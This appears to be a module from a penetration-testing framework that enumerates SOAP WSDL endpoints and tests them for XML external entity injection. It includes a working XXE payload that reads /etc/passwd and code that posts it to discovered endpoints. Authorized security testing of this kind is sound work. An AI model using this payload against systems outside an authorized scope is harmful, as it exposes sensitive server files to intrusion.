"""SOAP Audit — WSDL enumeration, XXE in SOAP, method fuzzing."""
from __future__ import annotations
import re, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
import aiohttp

CVSS_WSDL = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
CVSS40_WSDL = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
CVSS_XXE = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS40_XXE = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"

WSDL_PATHS = ["?wsdl", "?WSDL", "/services?wsdl", "/ws?wsdl", "/api?wsdl",
              "/soap?wsdl", "/Service.asmx?wsdl", "/WebService.asmx?wsdl"]

XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><test>&xxe;</test></soapenv:Body>
</soapenv:Envelope>'''

class SoapAudit(BaseModule):
    NAME = "soap_audit"
    DESCRIPTION = "SOAP: WSDL enumeration, XXE injection, method discovery"
    PHASE = 7
    TAGS = ["api", "soap", "xxe", "cwe-611"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=10),
        ) as session:
            wsdl_found = []

            # Discover WSDL endpoints
            for path in WSDL_PATHS:
                await self.rate_limit()
                url = f"{target}/{path}" if not path.startswith("?") else f"{target}{path}"
                try:
                    async with session.get(url) as resp:
                        body = await resp.text(errors="ignore")
                        if resp.status == 200 and ("wsdl:" in body.lower() or "definitions" in body.lower()):
                            methods = re.findall(r'<(?:wsdl:)?operation\s+name="([^"]+)"', body)
                            wsdl_found.append({"url": url, "methods": methods[:20]})
                except Exception:
                    pass

            if wsdl_found:
                total_methods = sum(len(w["methods"]) for w in wsdl_found)
                ev = Evidence(
                    extra={"wsdl_endpoints": [w["url"] for w in wsdl_found],
                           "methods": [m for w in wsdl_found for m in w["methods"]][:30]})
                self.new_finding(
                    title=f"SOAP WSDL Exposed — {len(wsdl_found)} endpoint(s), {total_methods} methods",
                    severity=Severity.MEDIUM,
                    description=(
                        f"SOAP WSDL exposed:\n"
                        + "\n".join(f"  {w['url']}: {', '.join(w['methods'][:5])}" for w in wsdl_found[:5])
                    ),
                    reproduction_steps=[f"curl {wsdl_found[0]['url']}"],
                    remediation="Disable WSDL publication in production. Require authentication.",
                    references=["CWE-200"],
                    evidence=ev, cvss_v31_vector=CVSS_WSDL, cvss_v40_vector=CVSS40_WSDL,
                    target=target)

                # Test XXE on each SOAP endpoint
                for wsdl in wsdl_found[:3]:
                    soap_url = wsdl["url"].split("?")[0]
                    await self.rate_limit()
                    try:
                        async with session.post(
                            soap_url, data=XXE_PAYLOAD,
                            headers={"Content-Type": "text/xml; charset=utf-8",
                                     "SOAPAction": "test"},
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            if "root:" in body or "/bin/" in body:
                                ev = Evidence(
                                    request_raw=XXE_PAYLOAD[:300],
                                    response_raw=body[:500])
                                self.new_finding(
                                    title=f"SOAP XXE — {soap_url}",
                                    severity=Severity.CRITICAL,
                                    description=f"XML External Entity injection confirmed at {soap_url}",
                                    reproduction_steps=[f"Send XXE payload to {soap_url}"],
                                    remediation="Disable DTD processing. Use defusedxml.",
                                    references=["CWE-611", "OWASP A05:2021"],
                                    evidence=ev, cvss_v31_vector=CVSS_XXE, cvss_v40_vector=CVSS40_XXE,
                                    target=target)
                    except Exception:
                        pass

        return self._make_result(start)

class TestSoapAudit:
    def test_wsdl_paths(self) -> None: assert "?wsdl" in WSDL_PATHS
    def test_phase(self) -> None: assert SoapAudit.PHASE == 7
